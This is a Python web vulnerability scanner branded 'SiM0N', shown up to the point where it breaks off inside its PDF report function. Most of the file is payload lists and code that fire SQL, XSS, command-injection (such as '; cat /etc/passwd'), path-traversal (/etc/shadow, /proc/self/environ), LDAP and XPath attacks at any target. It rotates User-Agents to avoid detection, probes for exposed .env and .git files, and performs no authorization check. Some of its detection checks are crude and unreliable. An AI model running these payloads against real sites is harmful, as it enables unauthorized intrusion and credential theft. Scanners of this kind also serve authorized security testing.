import sys
import argparse
import requests
import random
import threading # Not directly used in the final version with ThreadPoolExecutor for all tasks, but kept as it was in original.
import time
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_CENTER
from tqdm import tqdm
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
import logging

# Initialize colorama for colored console output
init(autoreset=True)

# Configure logging to capture informational messages and debug details
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# List of common User-Agent strings to mimic different browsers and avoid detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Common web application parameters to test for vulnerabilities
COMMON_PARAMS = [
    "id", "page", "search", "q", "query", "item", "cat", "category", "user", "username", "email", "name",
    "file", "path", "url", "redirect", "next", "return", "callback", "jsonp", "action", "cmd", "exec",
    "system", "shell", "command", "debug", "admin", "test", "demo", "example", "sample", "template",
    "theme", "skin", "style", "lang", "language", "locale", "country", "region", "timezone", "format",
    "type", "kind", "sort", "order", "limit", "offset", "start", "end", "from", "to", "min", "max",
    "filter", "include", "exclude", "show", "hide", "view", "display", "output", "print", "export",
    "import", "upload", "download", "source", "src", "target", "dest", "destination", "ref", "referer",
    "token", "key", "secret", "password", "pass", "pwd", "hash", "code", "auth", "login", "logout",
    "register", "signup", "profile", "account", "settings", "config", "option", "param", "parameter",
    "data", "value", "content", "text", "message", "comment", "description", "title", "subject",
    "tag", "tags", "keyword", "keywords", "term", "terms", "phrase", "word", "words", "string"
]

# Payloads for SQL Injection testing
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "' OR 1=1#", "') OR ('1'='1",
    "'; WAITFOR DELAY '0:0:5'--", "' OR sleep(5)--", "'; SELECT pg_sleep(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND '1'='1",
    "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL,NULL,NULL--",
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "'; SELECT version()--", "' AND 1=CAST((SELECT version()) AS int)--",
    "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1", "' AND (SELECT 1)=1--",
    "' AND 1=1 AND sqlite_version()>'0'--",
    "' || '1'=='1", "' || 1==1//", "'; return true; var fake='",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>52--"
]

# Payloads for Cross-Site Scripting (XSS) testing
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<script>alert('XSS')</script>", "<script>alert(document.domain)</script>",
    "\"><svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>", "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
    "javascript:alert(1)", "';alert(1);//", "\";alert(1);//", "'-alert(1)-'", "\"-alert(1)-\"",
    "<ScRiPt>alert(1)</ScRiPt>", "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<svg><script>alert(1)</script></svg>", "<iframe src=javascript:alert(1)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "\" onmouseover=\"alert(1)", "' onmouseover='alert(1)", "\" onfocus=\"alert(1)\" autofocus=\"",
    "<svg/onload=alert(1)>", "<img/src=x/onerror=alert(1)>", "<iframe/src=javascript:alert(1)>",
    "<script>alert`1`</script>", "<script>(alert)(1)</script>", "<script>window['alert'](1)</script>",
    "<style>@import'javascript:alert(1)';</style>", "<link rel=stylesheet href=javascript:alert(1)>",
    "<svg><foreignObject><iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(1)\"></iframe></foreignObject></svg>",
    "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
    "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "${{7*7}}"
]

# Payloads for Path Traversal testing
PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "../../../../etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%2fetc%u002fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "../../../../etc/passwd%00", "../../../../etc/passwd%00.jpg",
    "../../../../etc/hosts", "../../../../proc/version", "../../../../proc/self/environ",
    "../../../windows/system32/drivers/etc/hosts", "../../../boot.ini",
    "../../../../var/log/apache2/access.log", "../../../../var/log/apache/access.log",
    "../../../apache/logs/access.log", "../../../xampp/apache/logs/access.log"
]

# Payloads for Command Injection testing
COMMAND_INJECTION_PAYLOADS = [
    "; ls", "| ls", "& ls", "&& ls", "|| ls", "`ls`", "$(ls)", "${ls}",
    "; id", "| id", "& id", "&& id", "|| id", "`id`", "$(id)", "${id}",
    "; whoami", "| whoami", "& whoami", "&& whoami", "|| whoami", "`whoami`", "$(whoami)",
    "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
    "; ping -c 4 127.0.0.1", "| ping -c 4 127.0.0.1", "&& ping -c 4 127.0.0.1",
    "; sleep 5", "| sleep 5", "&& sleep 5", "|| sleep 5", "`sleep 5`", "$(sleep 5)"
]

# Payloads for LDAP Injection testing
LDAP_PAYLOADS = [
    "*", "*)(&", "*))%00", "*()|%26'", "*)(uid=*))(|(uid=*",
    "*)(|(password=*))", "*)(|(objectclass=*))", "*)(|(cn=*))",
    "admin)(&(password=*))", "admin)(&(|(password=*)(password=*))"
]

# Payloads for XPath Injection testing
XPATH_PAYLOADS = [
    "' or '1'='1", "' or 1=1 or ''='", "' or true() or ''='",
    "') or '1'='1", "') or 1=1 or (''='", "') or true() or (''='",
    "x' or 1=1 or 'x'='y", "x') or 1=1 or ('x'='y"
]

# Common subdomain prefixes for discovery
SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2",
    "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog", "pop3",
    "dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old",
    "www1", "beta", "shop", "shopping", "mobile", "support", "search", "wap", "directory",
    "img", "api", "cdn", "media", "static", "app", "store", "web", "chat", "video", "email",
    "secure", "payment", "payments", "upload", "downloads", "download", "staging", "demo",
    "qa", "testing", "development", "prod", "production", "live", "api2", "v2", "v1", "cdn2"
]

# Common sensitive files and directories to check for exposure
SENSITIVE_FILES = [
    "/robots.txt", "/.env", "/.git/config", "/.htaccess", "/.htpasswd", "/web.config",
    "/config.php", "/config.json", "/config.yml", "/config.xml", "/config.ini",
    "/settings.py", "/admin", "/admin.php", "/admin.html", "/admin/", "/wp-admin",
    "/wp-login.php", "/login", "/login.php", "/signin", "/signin.php", "/register",
    "/register.php", "/backup", "/backup.zip", "/backup.sql", "/backup.tar.gz",
    "/dump.sql", "/db.sql", "/database.sql", "/backup/database.sql", "/phpinfo.php",
    "/info.php", "/test.php", "/debug.php", "/console", "/_profiler", "/phpmyadmin",
    "/dbadmin", "/pma", "/myadmin", "/sqlmanager", "/mysqlmanager", "/phpMyAdmin",
    "/phpmyadmin/", "/server-status", "/server-info", "/.well-known/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml", "/.svn/entries", "/.git/HEAD",
    "/.DS_Store", "/.idea/workspace.xml", "/.project", "/.settings", "/.travis.yml",
    "/package.json", "/composer.json", "/composer.lock", "/yarn.lock", "/Gemfile.lock",
    "/requirements.txt", "/Procfile", "/Dockerfile", "/docker-compose.yml",
    "/.dockerignore", "/.env.example", "/.env.local", "/.env.test", "/.env.production",
    "/.env.development", "/.env.staging", "/.env.dev", "/.env.prod", "/.env.qa"
]

# Standard HTTP methods to test for allowed methods
HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']

def print_banner():
    """Prints the ASCII art banner and tool information."""
    main_banner = r"""
░▒▓███████▓▒░ ░▒▓█▓▒░ ░▒▓██████████████▓▒░  ░▒▓████████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░         ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░
    """
    subtitle = "SiM0N Enhanced Vulnerability Scanner v2.0"
    print(Fore.GREEN + main_banner)
    print(Fore.RED + subtitle.center(80, "-"))
    print(Fore.YELLOW + "Features: Subdomain Discovery | Advanced Payloads | Parameter Mining | Live Domain Check")
    print("\n")

def discover_subdomains(domain):
    """
    Discovers subdomains for a given domain using DNS queries and a common wordlist.
    Utilizes a ThreadPoolExecutor for concurrent DNS resolution.
    """
    subdomains = set()
    
    print(Fore.CYAN + f"[*] Discovering subdomains for {domain}...")
    
    def check_subdomain(sub):
        """Helper function to check if a subdomain resolves to an A record."""
        try:
            full_domain = f"{sub}.{domain}"
            dns.resolver.resolve(full_domain, 'A')
            return full_domain
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, dns.exception.Timeout):
            # These exceptions indicate the subdomain does not exist or cannot be resolved
            return None
        except Exception as e:
            # Catch any other unexpected errors during DNS resolution
            logging.debug(f"Error resolving subdomain {sub}.{domain}: {e}")
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        # Submit all subdomain checks to the thread pool
        future_to_sub = {executor.submit(check_subdomain, sub): sub for sub in SUBDOMAIN_WORDLIST}
        for future in as_completed(future_to_sub):
            # Process results as they complete
            result = future.result()
            if result:
                subdomains.add(result)
                print(Fore.GREEN + f"[+] Found subdomain: {result}")
    
    return list(subdomains)

def check_live_domains(domains):
    """
    Checks which of the given domains are live and accessible by sending HTTP/HTTPS requests.
    Prioritizes HTTP, then tries HTTPS if HTTP fails.
    """
    live_domains = []
    
    def check_domain(domain):
        """Helper function to check if a single domain is live."""
        try:
            # Ensure URL has a scheme for requests
            url = f"http://{domain}" if not domain.startswith(('http://', 'https://')) else domain
            
            # Try HTTP first
            resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, 
                                 timeout=10, allow_redirects=True)
            if resp.status_code == 200:
                return url
            
            # If HTTP failed or redirected, try HTTPS
            if url.startswith('http://'):
                https_url = url.replace('http://', 'https://')
                resp = requests.get(https_url, headers={'User-Agent': random.choice(USER_AGENTS)}, 
                                  timeout=10, allow_redirects=True)
                if resp.status_code == 200:
                    return https_url
        except requests.exceptions.RequestException as e:
            # Catch request-specific exceptions (e.g., connection errors, timeouts)
            logging.debug(f"Error checking live domain {domain}: {e}")
            pass # Continue to next domain if request fails
        except Exception as e:
            # Catch any other unexpected errors
            logging.debug(f"Unexpected error checking live domain {domain}: {e}")
            pass
        return None
    
    print(Fore.CYAN + f"[*] Checking {len(domains)} domains for accessibility...")
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        # Submit all domain checks to the thread pool
        future_to_domain = {executor.submit(check_domain, domain): domain for domain in domains}
        for future in as_completed(future_to_domain):
            # Process results as they complete
            result = future.result()
            if result:
                live_domains.append(result)
                print(Fore.GREEN + f"[+] Live domain: {result}")
    
    return list(live_domains)

def extract_parameters_from_url(url):
    """Extracts query parameters from a given URL."""
    parsed = urlparse(url)
    return list(parse_qs(parsed.query).keys())

def find_form_parameters(url):
    """
    Finds form input names, select names, textarea names, and potential JavaScript
    parameters by parsing the HTML content of a given URL.
    """
    try:
        resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
        resp.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        params = set()
        
        # Find parameters from HTML forms (input, select, textarea tags)
        for form in soup.find_all('form'):
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                if name:
                    params.add(name)
        
        # Regex to find potential JS parameters (e.g., name="param", id="param", data-param="value")
        js_params = re.findall(r'(?:name|id|data-[\w-]+)\s*=\s*[\'"]?([\w_]+)[\'"]?', resp.text)
        params.update(js_params)
        
        # Extract parameters from links (href attributes)
        for link in soup.find_all('a', href=True):
            link_params = extract_parameters_from_url(link['href'])
            params.update(link_params)
        
        return list(params)
    except requests.exceptions.RequestException as e:
        logging.debug(f"Error fetching form parameters from {url}: {e}")
        return []
    except Exception as e:
        logging.debug(f"Unexpected error finding form parameters from {url}: {e}")
        return []

def crawl_urls(base_url, max_depth):
    """
    Enhanced URL crawler that explores links within the same domain up to a specified depth.
    It also extracts URL and form parameters during crawling.
    """
    visited = set()
    to_visit = [(base_url, 0)]
    found_urls = set([base_url])
    all_parameters = set()
    
    while to_visit:
        url, depth = to_visit.pop(0)
        if depth >= max_depth or url in visited:
            continue
        visited.add(url)
        
        try:
            # Extract parameters from the current URL's query string
            url_params = extract_parameters_from_url(url)
            all_parameters.update(url_params)
            
            # Find parameters within HTML forms on the current page
            form_params = find_form_parameters(url)
            all_parameters.update(form_params)
            
            # Fetch content of the current URL to find new links
            resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
            resp.raise_for_status() # Raise an exception for HTTP errors
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Find all anchor tags (links)
            for link in soup.find_all('a', href=True):
                abs_url = urljoin(url, link['href']) # Convert relative URLs to absolute
                parsed_abs_url = urlparse(abs_url)
                parsed_base_url = urlparse(base_url)

                # Ensure the discovered link stays within the same domain as the base URL
                # and has not been visited yet (to prevent infinite loops and redundant checks)
                if parsed_abs_url.netloc == parsed_base_url.netloc and abs_url not in found_urls:
                    # Normalize URL by removing query parameters and fragments for comparison
                    # This helps in avoiding duplicate entries for the same page with different query strings
                    normalized_url = urlunparse(parsed_abs_url._replace(query=None, fragment=None)) 
                    if normalized_url not in found_urls:
                        found_urls.add(normalized_url)
                        to_visit.append((abs_url, depth + 1)) # Add to queue for further crawling
        except requests.exceptions.RequestException as e:
            logging.debug(f"Error crawling {url}: {e}")
            continue
        except Exception as e:
            logging.debug(f"Unexpected error during crawling {url}: {e}")
            continue
    
    return list(found_urls), list(all_parameters)

class EnhancedVulnerabilityScanner:
    """
    Core class for performing various web vulnerability scans on a target URL.
    It leverages discovered parameters and a predefined set of payloads.
    """
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/') # Remove trailing slash for consistent URL handling
        self.vulnerabilities = [] # Stores all identified vulnerabilities
        self.parameters = set() # Stores parameters to test

    def scan(self, discovered_params=None):
        """
        Initiates the scanning process for various vulnerability types.
        Combines common parameters with any newly discovered ones.
        """
        if discovered_params:
            self.parameters.update(discovered_params)
        self.parameters.update(COMMON_PARAMS) # Add common parameters for comprehensive testing
        
        print(Fore.CYAN + f"[*] Scanning {self.target_url} with {len(self.parameters)} parameters...")
        
        # Execute checks for different vulnerability types
        self.check_sql_injection()
        self.check_xss()
        self.check_path_traversal()
        self.check_command_injection()
        self.check_ldap_injection()
        self.check_xpath_injection()
        self.check_clickjacking()
        self.check_open_redirect()
        self.check_sensitive_files()
        self.check_http_methods()
        self.check_security_headers()
        
        return self.categorize_vulnerabilities()

    def categorize_vulnerabilities(self):
        """Categorizes identified vulnerabilities by their severity level."""
        severity_map = {
            'SQL Injection': 'Critical',
            'Command Injection': 'Critical',
            'XSS': 'High',
            'Path Traversal': 'High',
            'LDAP Injection': 'High',
            'XPath Injection': 'High',
            'Open Redirect': 'Medium',
            'Sensitive File/Directory': 'Medium',
            'HTTP Methods': 'Medium',
            'Security Headers': 'Low',
            'Clickjacking': 'Low'
        }
        categorized = {'Critical': [], 'High': [], 'Medium': [], 'Low': []}
        for vuln in self.vulnerabilities:
            severity = severity_map.get(vuln['type'], 'Low') # Default to 'Low' if type not mapped
            categorized[severity].append(vuln)
        return categorized

    def send_request(self, url, params=None, method='GET', data=None):
        """
        Sends an HTTP request to the specified URL with given parameters and method.
        Handles User-Agent headers and basic error logging.
        """
        headers = {'User-Agent': random.choice(USER_AGENTS)} # Rotate User-Agents
        try:
            if method.upper() == 'POST':
                resp = requests.post(url, data=data, headers=headers, timeout=10, allow_redirects=True)
            else: # For GET or other methods, parameters are typically in the URL query string
                if params:
                    parsed_url = urlparse(url)
                    query_params = parse_qs(parsed_url.query) # Parse existing query parameters
                    query_params.update(params) # Add/overwrite with new parameters
                    # Reconstruct the query string, handling potential list values from parse_qs
                    new_query = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}" for k, v in query_params.items()])
                    url = urlunparse(parsed_url._replace(query=new_query)) # Rebuild URL with new query
                resp = requests.request(method, url, headers=headers, timeout=10, allow_redirects=True)
            resp.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx status codes)
            return resp
        except requests.exceptions.RequestException as e:
            logging.debug(f"Request failed for {url} ({method}): {e}")
            return None
        except Exception as e:
            logging.debug(f"Unexpected error in send_request to {url} ({method}): {e}")
            return None

    def check_sql_injection(self):
        """Tests for SQL Injection vulnerabilities by injecting SQL payloads."""
        print(Fore.YELLOW + "[*] Testing SQL Injection...")
        for param in self.parameters:
            for payload in SQLI_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    # Look for common SQL error messages in the response
                    error_patterns = [
                        "syntax error", "mysql", "you have an error in your sql syntax",
                        "postgresql", "ora-", "microsoft ole db", "sqlite", "warning: mysql",
                        "error in your sql", "mariadb", "driver", "jdbc", "database error"
                    ]
                    if any(pattern in resp.text.lower() for pattern in error_patterns):
                        print(Fore.RED + f"[!] SQL Injection detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"SQL Injection vulnerability found with parameter '{param}'"
                        })

    def check_xss(self):
        """Tests for Cross-Site Scripting (XSS) vulnerabilities by injecting XSS payloads."""
        print(Fore.YELLOW + "[*] Testing XSS vulnerabilities...")
        for param in self.parameters:
            for payload in XSS_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                # A basic check: if the payload is reflected in the response body, it's a potential XSS.
                # Real XSS detection often requires more sophisticated parsing and browser simulation.
                if resp and payload in resp.text:
                    print(Fore.RED + f"[!] XSS detected at {resp.url} with param '{param}' and payload '{payload}'")
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'url': resp.url,
                        'parameter': param,
                        'payload': payload,
                        'description': f"XSS vulnerability found with parameter '{param}'"
                    })

    def check_path_traversal(self):
        """Tests for Path Traversal vulnerabilities by injecting directory traversal payloads."""
        print(Fore.YELLOW + "[*] Testing Path Traversal...")
        for param in self.parameters:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    # Look for patterns indicative of file system access (e.g., /etc/passwd content)
                    traversal_patterns = [
                        "root:x", "[extensions]", "boot loader", "system volume information",
                        "program files", "windows", "config.sys", "autoexec.bat",
                        "daemon:x" # Added for Linux /etc/passwd output
                    ]
                    if any(pattern in resp.text.lower() for pattern in traversal_patterns):
                        print(Fore.RED + f"[!] Path Traversal detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'Path Traversal',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"Path Traversal vulnerability found with parameter '{param}'"
                        })

    def check_command_injection(self):
        """Tests for Command Injection vulnerabilities by injecting OS commands."""
        print(Fore.YELLOW + "[*] Testing Command Injection...")
        for param in self.parameters:
            for payload in COMMAND_INJECTION_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    # Look for patterns indicative of command execution output
                    command_patterns = [
                        "uid=", "gid=", "groups=", "total ", "directory of", "volume serial number",
                        "bin", "sbin", "usr" # Common in 'ls' or 'id' output
                    ]
                    if any(pattern in resp.text.lower() for pattern in command_patterns):
                        print(Fore.RED + f"[!] Command Injection detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"Command Injection vulnerability found with parameter '{param}'"
                        })

    def check_ldap_injection(self):
        """Tests for LDAP Injection vulnerabilities by injecting LDAP filter syntax."""
        print(Fore.YELLOW + "[*] Testing LDAP Injection...")
        for param in self.parameters:
            for payload in LDAP_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    # Look for common LDAP error messages or directory attributes
                    ldap_patterns = [
                        "javax.naming.directory", "ldap", "cn=", "ou=", "dc=", "objectclass",
                        "ldap_search", "ldap_bind" # common error messages
                    ]
                    if any(pattern in resp.text.lower() for pattern in ldap_patterns):
                        print(Fore.RED + f"[!] LDAP Injection detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'LDAP Injection',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"LDAP Injection vulnerability found with parameter '{param}'"
                        })

    def check_xpath_injection(self):
        """Tests for XPath Injection vulnerabilities by injecting XPath syntax."""
        print(Fore.YELLOW + "[*] Testing XPath Injection...")
        for param in self.parameters:
            for payload in XPATH_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    # Look for common XPath error messages
                    xpath_patterns = [
                        "xpath", "xquery", "xmlexception", "xpath syntax error",
                        "failed to compile xpath expression", "invalid xpath" # common error messages
                    ]
                    if any(pattern in resp.text.lower() for pattern in xpath_patterns):
                        print(Fore.RED + f"[!] XPath Injection detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'XPath Injection',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"XPath Injection vulnerability found with parameter '{param}'"
                        })

    def check_clickjacking(self):
        """
        Tests for Clickjacking vulnerability by checking for missing X-Frame-Options
        or Content-Security-Policy headers.
        """
        print(Fore.YELLOW + "[*] Testing Clickjacking...")
        resp = self.send_request(self.target_url)
        if resp and 'x-frame-options' not in resp.headers and 'content-security-policy' not in resp.headers:
            print(Fore.YELLOW + f"[!] Clickjacking risk at {self.target_url}: No X-Frame-Options or CSP frame policy set")
            self.vulnerabilities.append({
                'type': 'Clickjacking',
                'url': self.target_url,
                'description': 'No X-Frame-Options or Content-Security-Policy (frame-ancestors) header set, indicating potential Clickjacking vulnerability.'
            })

    def check_open_redirect(self):
        """Tests for Open Redirect vulnerabilities by injecting redirect payloads."""
        print(Fore.YELLOW + "[*] Testing Open Redirect...")
        # Payloads that attempt to redirect to an external malicious site
        redirect_payloads = ["//evil.com", "http://evil.com", "https://evil.com"] 
        for param in self.parameters:
            for payload in redirect_payloads:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                # If the response URL contains the payload or redirects to the payload's domain, it's a hit.
                if resp and (payload in resp.url or urlparse(resp.url).netloc == urlparse(payload).netloc):
                    print(Fore.YELLOW + f"[!] Open Redirect detected at {resp.url} with param '{param}' (Payload: {payload})")
                    self.vulnerabilities.append({
                        'type': 'Open Redirect',
                        'url': resp.url,
                        'parameter': param,
                        'payload': payload,
                        'description': f"Open Redirect vulnerability found with parameter '{param}'"
                    })

    def check_sensitive_files(self):
        """Tests for exposure of common sensitive files and directories."""
        print(Fore.YELLOW + "[*] Testing Sensitive Files...")
        for path in SENSITIVE_FILES:
            url = urljoin(self.target_url, path) # Construct full URL for the sensitive file
            resp = self.send_request(url)
            # If status code is 200 (OK) and the response has some content, it's likely exposed.
            if resp and resp.status_code == 200 and len(resp.text) > 10: 
                print(Fore.YELLOW + f"[!] Sensitive file or directory found: {url}")
                self.vulnerabilities.append({
                    'type': 'Sensitive File/Directory',
                    'url': url,
                    'description': f"Accessible sensitive file or directory: {path}"
                })

    def check_http_methods(self):
        """
        Tests for potentially risky HTTP methods allowed on the target URL.
        Methods other than GET/POST being allowed can sometimes indicate misconfigurations.
        """
        print(Fore.YELLOW + "[*] Testing HTTP Methods...")
        for method in HTTP_METHODS:
            try:
                resp = requests.request(method, self.target_url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
                # If the status code is not a typical error for disallowed methods (e.g., 405 Method Not Allowed, 501 Not Implemented),
                # it suggests the method might be allowed or handled.
                if resp.status_code not in [400, 401, 403, 404, 405, 501]:
                    print(Fore.YELLOW + f"[!] Potentially risky HTTP method allowed: {method} (Status: {resp.status_code})")
                    self.vulnerabilities.append({
                        'type': 'HTTP Methods',
                        'url': self.target_url,
                        'description': f"Potentially risky HTTP method allowed: {method} (Status: {resp.status_code})"
                    })
            except requests.exceptions.RequestException as e:
                logging.debug(f"Error testing HTTP method {method} on {self.target_url}: {e}")
                pass # Continue to next method even if one request fails

    def check_security_headers(self):
        """
        Checks for the presence of common security-related HTTP response headers.
        Missing headers can indicate a lack of security hardening.
        """
        print(Fore.YELLOW + "[*] Checking Security Headers...")
        resp = self.send_request(self.target_url)
        if resp:
            missing_headers = []
            # List of important security headers to check
            security_headers = [
                'X-XSS-Protection', 'X-Content-Type-Options', 'X-Frame-Options',
                'Content-Security-Policy', 'Strict-Transport-Security', 'Referrer-Policy'
            ]
            
            for header in security_headers:
                # Check for header presence in a case-insensitive manner
                if header.lower() not in [h.lower() for h in resp.headers.keys()]: 
                    missing_headers.append(header)
            
            if missing_headers:
                print(Fore.YELLOW + f"[!] Missing security headers: {', '.join(missing_headers)}")
                self.vulnerabilities.append({
                    'type': 'Security Headers',
                    'url': self.target_url,
                    'description': f"Missing security headers: {', '.join(missing_headers)}"
                })

def generate_report(filename, findings):
    """
    Generates a PDF report of the scan findings using ReportLab.
    Findings are categorized and sorted by severity.
    """
    doc = SimpleDocTemplate(filename, pagesize=letter)
    styles = getSampleStyleSheet()
    # Custom style for severity headings in the PDF
    styles.add(ParagraphStyle(name='SeverityHeading', parent=styles['Heading2'], alignment=TA_CENTER))
    elements = []
    elements.append(Paragraph("Bug Report By SiM0N", styles['Title']))
    elements.append(Spacer(1, 12)) # Add some vertical space
    
    # Define the order of severity for reporting
    severity_order = ['Critical', 'High', 'Medium', 'Low']
    
    for severity in severity_order:
        if findings[severity]: # Only add section if there are findings for this severity
            elements.append(Paragraph(f"{severity} Risk Findings", styles['SeverityHeading']))
            elements.append(Spacer(1, 8))
            for vuln in findings[severity]:
                elements.append(Paragraph(f"<b>Type:</b> {vuln['type']}", styles['h3'])) # Bold type
                elements.append(Paragraph(f"<b>URL:</b> {vuln['url']}", styles['Normal'])) # Normal text for URL
                if 'parameter' in vuln:
                    elements.append(Paragraph(f"<b>Parameter:</b> {vuln['parameter']}", styles['Normal']))
                if 'payload' in vuln:
                    elements.append(Paragraph(f"<b>Payload:</b> {vuln['payload']}", styles['Normal']))
                elements.append(Paragraph(f"<b>Description:</b> {vuln['description']}", styles['Normal']))
                elements.append(Spacer(1, 8)) # Space after each vulnerability entry
